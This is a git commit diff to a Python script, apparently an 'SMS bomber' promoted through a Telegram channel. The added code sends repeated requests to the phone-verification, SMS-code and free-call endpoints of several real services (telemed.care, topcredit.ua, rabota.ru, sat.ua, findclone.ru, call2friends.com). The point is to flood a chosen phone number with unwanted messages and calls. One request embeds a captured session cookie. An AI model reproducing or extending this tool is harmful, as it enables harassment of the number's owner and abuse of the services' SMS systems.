6485b367f457f4542e3f1a73fffe61e08f61f4d7
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-02-02 14:44:02 +0200

    Add files via upload

--- Spavveri.py
+++ Spavveri.py
@@ -23,6 +23,7 @@ def generate_info():
         username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
     _email = _name + '@gmail.com'
     email = _email
+    phone_plus = "+" + number
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 console.print('''[blue]
  Telegram Channel - @Bomberukr
@@ -169,3 +170,39 @@ for _ in track(range(run)):
          print('nl.ua')
  except:
          print('Не отправлено (nl.ua)')
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ try:
+     requests.post('https://api.telemed.care/oauth/verify_phone_number', json={"phone_number": number}, headers={'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.8'})
+     print('telemed.care')
+ except:
+     print('Не доставлено (telemed.care)')
+
+ try:
+     requests.post('https://admin.topcredit.ua/api/sms/password-verification/create', json={"phone": number})
+     print('topcredit.ua')
+ except:
+     print('Не доставлено (topcredit.ua)')
+
+ try:
+     requests.post('https://chernovtsy.rabota.ru/api-web/v6/code/send.json', json={'request':{'login':"+" + number},'request_id':'90560914','application_id':'13','rabota_ru_id':'616b0c9f211248003394866342942900','user_tags':[{'id':'0','add_date':'2021-10-16','name':'main_page_carees_story_control2'},{'id':'0','add_date':'2021-10-16','name':'careers_main_page_widget_target'},{'id':'0','add_date':'2021-10-16','name':'hr_banners_show'},{'id':'0','add_date':'2021-10-16','name':'hr_login_form_spa'},{'id':'0','add_date':'2021-10-16','name':'vacancy_split_view_careers_widget_target'},{'id':'0','add_date':'2021-10-16','name':'courses_widget_control2'},{'id':'0','add_date':'2021-10-16','name':'usp_company_review_form_target'},{'id':'0','add_date':'2021-10-16','name':'profession_widget_control2'},{'id':'0','add_date':'2021-10-16','name':'web_snippetclick2_control1'},{'id':'0','add_date':'2021-10-16','name':'hr_new_scheduled_action_list_active'},{'id':'0','add_date':'2021-10-25','name':'main_page_careers_story2_control2'}]}, headers={'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':str(user_agent),'cookie': 'frontend:region=chernovtsy%3A1880; frontend:rabota-id:v1=616b0c9f211248003394866342942900; frontend:location:v4=null; tmr_lvid=9baf2ab036dce945b662b83be6d963a2; tmr_lvidTS=1634405541448; _ga=GA1.2.942388139.1634405542; _ym_d=1634405542; _ym_uid=1634405542182425930; user_tags=%5B%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22main_page_carees_story_control2%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22careers_main_page_widget_target%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22hr_banners_show%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22hr_login_form_spa%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22vacancy_split_view_careers_widget_target%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22courses_widget_control2%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22usp_company_review_form_target%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22profession_widget_control2%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22web_snippetclick2_control1%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22hr_new_scheduled_action_list_active%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-25%22%2C%22name%22%3A%22main_page_careers_story2_control2%22%7D%5D; mobile-app-popup-next-show-timer=1; mobile-app-popup-close-count=11; tmr_reqNum=16; qrator_ssid=1635339916.326.pKcDG62ujL7G3tOC-f1d0aj2bb2ut8r38h6n8mu2fc5umnsta; story_group_count=4; story_group_time=Wed%20Oct%2027%202021%2016%3A05%3A34%20GMT%2B0300%20(GMT%2B03%3A00); _gid=GA1.2.424888797.1635339936; _gat_gtag_UA_3926701_1=1; SRVID=front2-msk2.rabota|YXlOr|YXlOo; sid=6nEXiaDr2f7eGfJwdbRucfa7mo8lzigp', 'referer': 'https://chernovtsy.rabota.ru/?page=0', 'vary': 'Accept-Encoding', 'x-content-type-options': 'nosniff', 'x-xss-protection': '1; mode=block'})
+     print('rabota.ru')
+ except:
+     print('Не доставлено(rabota.ru)')
+
+ try:
+     requests.post('https://urm.sat.ua/openws/hs/api/v2.0/auth/check/json?phone=' + phone_plus + '&app=cabinet&language=uk')   
+     print('sat.ua')
+ except:
+     print('Не отправлено (sat.ua)')
+
+ try:
+     requests.get('https://findclone.ru/register?phone=+' + number + '', headers={'User-Agent': str(user_agent),'X-Requested-With': 'XMLHttpRequest'})
+     print('findclone.ru')
+ except:
+     print('Не доставлено (findclone.ru)')
+
+ try:
+     requests.post('https://call2friends.com/call-my-phone/web/request-free-call', params={'phone': number,'domain':'CALL2FRIENDS','browser':'{\"mozilla\":true,\"version\":\"89.0\"}','fgp':str(uuid.uuid4()),'fgp2':str(uuid.uuid4())}, headers={'Cookie':'smscookie=' + str(uuid.uuid4())})
+     print('call2friends.com')
+ except:
+     print('Не доставлено (call2friends.com)')
